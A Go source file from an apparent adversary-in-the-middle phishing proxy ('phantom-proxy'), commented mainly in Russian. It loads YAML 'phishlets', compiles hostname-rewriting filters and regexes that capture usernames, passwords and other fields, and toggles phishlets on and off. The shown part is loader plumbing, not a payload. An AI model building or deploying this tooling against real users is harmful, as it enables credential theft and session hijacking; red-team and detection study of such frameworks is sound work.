package proxy

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"

	"gopkg.in/yaml.v3"
	"go.uber.org/zap"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// loadPhishlets загружает phishlets из директории
func (p *HTTPProxy) loadPhishlets() error {
	dir := p.cfg.PhishletsPath

	// nothing to do if no path configured
	if dir == "" {
		p.logger.Debug("Phishlets path is empty, skipping load")
		return nil
	}

	// Проверка существования директории
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		p.logger.Info("Phishlets directory does not exist, creating", zap.String("path", dir))
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("failed to create phishlets directory: %w", err)
		}
		return nil
	}

	// Поиск всех YAML файлов
	pattern := filepath.Join(dir, "*.yaml")
	files, err := filepath.Glob(pattern)
	if err != nil {
		return fmt.Errorf("failed to glob phishlet files: %w", err)
	}

	// Загрузка каждого phishlet
	for _, file := range files {
		if err := p.loadPhishlet(file); err != nil {
			p.logger.Warn("Failed to load phishlet",
				zap.String("file", file),
				zap.Error(err))
			continue
		}
	}

	p.logger.Info("Phishlets loaded", zap.Int("count", len(p.phishlets)))
	return nil
}

// loadPhishlet загружает один phishlet из файла
func (p *HTTPProxy) loadPhishlet(filename string) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read file: %w", err)
	}

	var phishlet Phishlet
	if err := yaml.Unmarshal(data, &phishlet); err != nil {
		return fmt.Errorf("failed to parse YAML: %w", err)
	}

	// Генерация ID из имени файла
	phishlet.ID = filepath.Base(filename)
	phishlet.ID = phishlet.ID[:len(phishlet.ID)-len(filepath.Ext(phishlet.ID))]

	// Компиляция регулярных выражений для sub_filters
	if err := p.compileSubFilters(&phishlet); err != nil {
		return fmt.Errorf("failed to compile sub_filters: %w", err)
	}

	// Компиляция регулярных выражений для credentials
	if err := p.compileCredFilters(&phishlet); err != nil {
		return fmt.Errorf("failed to compile cred filters: %w", err)
	}

	// Сохранение в память
	p.phishlets[phishlet.ID] = &phishlet

	// Determine enabled state from database if present
	if p.db != nil {
		if dbEntry, err := p.db.GetPhishlet(phishlet.ID); err == nil {
			phishlet.Enabled = dbEntry.Enabled
		}
	}

	// Сохранение в БД и логирование
	targetDomain := "unknown"
	if len(phishlet.ProxyHosts) > 0 {
		targetDomain = phishlet.ProxyHosts[0].Domain
		// persist to database if available (new entry)
		if p.db != nil {
			dbPhishlet := &database.Phishlet{
				ID:      phishlet.ID,
				Name:    phishlet.ID,
				Config:  string(data),
				Enabled: phishlet.Enabled,
			}
			if err := p.db.CreatePhishlet(dbPhishlet); err != nil {
				p.logger.Warn("Failed to save phishlet to DB", zap.Error(err))
			}
		}
	}

	p.logger.Info("Phishlet loaded",
		zap.String("id", phishlet.ID),
		zap.String("target", targetDomain),
		zap.Int("sub_filters", len(phishlet.SubFilters)))

	return nil
}

// compileSubFilters компилирует regex для sub_filters
func (p *HTTPProxy) compileSubFilters(phishlet *Phishlet) error {
	for i := range phishlet.SubFilters {
		filter := &phishlet.SubFilters[i]

		// Замена плейсхолдеров
		search := filter.Search
		search = regexp.QuoteMeta(search)
		search = regexp.MustCompile(`\\{hostname\\}`).ReplaceAllString(search, "([^/]+)")
		search = regexp.MustCompile(`\\{subdomain\\}`).ReplaceAllString(search, "([^/]+)")
		search = regexp.MustCompile(`\\{domain\\}`).ReplaceAllString(search, "([^/]+)")

		// Компиляция regex
		regex, err := regexp.Compile(search)
		if err != nil {
			return fmt.Errorf("invalid regex for sub_filter: %w", err)
		}
		filter.regex = regex
	}
	return nil
}

// compileCredFilters компилирует regex для credentials
func (p *HTTPProxy) compileCredFilters(phishlet *Phishlet) error {
	// Username
	if phishlet.Credentials.Username.Search != "" {
		regex, err := regexp.Compile(phishlet.Credentials.Username.Search)
		if err != nil {
			return fmt.Errorf("invalid regex for username: %w", err)
		}
		phishlet.Credentials.Username.regex = regex
	}

	// Password
	if phishlet.Credentials.Password.Search != "" {
		regex, err := regexp.Compile(phishlet.Credentials.Password.Search)
		if err != nil {
			return fmt.Errorf("invalid regex for password: %w", err)
		}
		phishlet.Credentials.Password.regex = regex
	}

	// Custom fields
	for i := range phishlet.Credentials.Custom {
		field := &phishlet.Credentials.Custom[i]
		if field.Search != "" {
			regex, err := regexp.Compile(field.Search)
			if err != nil {
				return fmt.Errorf("invalid regex for custom field: %w", err)
			}
			field.regex = regex
		}
	}

	return nil
}

// GetPhishlet возвращает phishlet по ID
func (p *HTTPProxy) GetPhishlet(id string) (*Phishlet, error) {
	p.mu.RLock()
	defer p.mu.RUnlock()

	phishlet, ok := p.phishlets[id]
	if !ok {
		return nil, fmt.Errorf("phishlet not found: %s", id)
	}

	return phishlet, nil
}

// ListPhishlets возвращает список всех phishlets
func (p *HTTPProxy) ListPhishlets() []*Phishlet {
	p.mu.RLock()
	defer p.mu.RUnlock()

	phishlets := make([]*Phishlet, 0, len(p.phishlets))
	for _, ph := range p.phishlets {
		phishlets = append(phishlets, ph)
	}

	return phishlets
}

// EnablePhishlet активирует phishлет
func (p *HTTPProxy) EnablePhishlet(id string) error {
	p.mu.Lock()
	defer p.mu.Unlock()

	ph, ok := p.phishlets[id]
	if !ok {
		return fmt.Errorf("phishlet not found: %s", id)
	}
	ph.Enabled = true
	if p.db != nil {
		if err := p.db.UpdatePhishletEnabled(id, true); err != nil {
			p.logger.Warn("Failed to update phishlet enabled state", zap.Error(err))
		}
	}
	p.logger.Info("Phishlet enabled", zap.String("id", id))
	return nil
}

// DisablePhishlet деактивирует phишlet
func (p *HTTPProxy) DisablePhishlet(id string) error {
	p.mu.Lock()
	defer p.mu.Unlock()

	ph, ok := p.phishlets[id]
	if !ok {
		return fmt.Errorf("phishlet not found: %s", id)
	}
	ph.Enabled = false
	if p.db != nil {
		if err := p.db.UpdatePhishletEnabled(id, false); err != nil {
			p.logger.Warn("Failed to update phishlet enabled state", zap.Error(err))
		}
	}
	p.logger.Info("Phishlet disabled", zap.String("id", id))
	return nil
}
